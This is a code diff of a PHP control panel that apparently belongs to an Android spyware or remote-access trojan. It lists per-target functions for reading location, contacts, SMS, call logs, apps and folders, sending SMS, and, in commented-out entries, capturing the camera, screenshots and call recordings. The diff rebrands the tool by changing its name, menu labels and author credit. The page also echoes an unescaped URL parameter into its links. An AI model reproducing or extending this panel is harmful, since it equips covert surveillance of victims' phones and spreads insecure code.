@@ -54,7 +54,7 @@ if (!isset($_GET['target']) || !isset($_GET['type'])){
     <div class="container-fluid">
         <div class="row">
             <div class="col-lg-4 col-lg-offset-4">
-                <a class="navbar-brand" href="index.php">RAPTOR Kontrol Paneli</a>
+                <a class="navbar-brand" href="index.php">Riya control Panel</a>
             </div>
         </div>
     </div>
@@ -68,7 +68,7 @@ if (!isset($_GET['target']) || !isset($_GET['type'])){
             <div class="list-group">
                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=1" class="list-group-item <?php if ($_GET['type']==1){ echo 'active';}?>">Specifications</a>
                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=2" class="list-group-item <?php if ($_GET['type']==2){ echo 'active';}?>">Location</a>
-                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=3" class="list-group-item <?php if ($_GET['type']==3){ echo 'active';}?>"">Guide</a>
+                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=3" class="list-group-item <?php if ($_GET['type']==3){ echo 'active';}?>"">Contact</a>
                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=4" class="list-group-item <?php if ($_GET['type']==4){ echo 'active';}?>">GetSms</a>
                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=5" class="list-group-item <?php if ($_GET['type']==5){ echo 'active';}?>">Send SMS</a>
                <!-- <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=6" class="list-group-item <?php if ($_GET['type']==6){ echo 'active';}?>">Listening to media</a> -->
@@ -83,7 +83,7 @@ if (!isset($_GET['target']) || !isset($_GET['type'])){
                 <!--  <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=9" class="list-group-item <?php if ($_GET['type']==9){ echo 'active';}?>">Screenshot</a> -->
                 <!--  <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=10" class="list-group-item <?php if ($_GET['type']==10){ echo 'active';}?>">Camera</a> -->
                 <!-- <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=11" class="list-group-item <?php if ($_GET['type']==11){ echo 'active';}?>">Scanner</a> -->
-                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=12" class="list-group-item <?php if ($_GET['type']==12){ echo 'active';}?>">Searches</a>
+                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=12" class="list-group-item <?php if ($_GET['type']==12){ echo 'active';}?>">Calllogs</a>
                 <!-- <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=13" class="list-group-item <?php if ($_GET['type']==13){ echo 'active';}?>">Call Voice Recordings</a> -->
                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=14" class="list-group-item <?php if ($_GET['type']==14){ echo 'active';}?>">Application</a>
                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=15" class="list-group-item <?php if ($_GET['type']==15){ echo 'active';}?>">Folders</a>
@@ -168,7 +168,7 @@ if (!isset($_GET['target']) || !isset($_GET['type'])){
     </div>
     <div class="row tall-row">
         <div class="col-md-offset-8">
-            <p>Created by <a href="#">Mehmet Şirin Sulan</a>. &copy; 2021</p>
+            <p>Created by <a href="#">DARKSHUBH</a>. &copy; 2023</p>
         </div>
     </div>
 
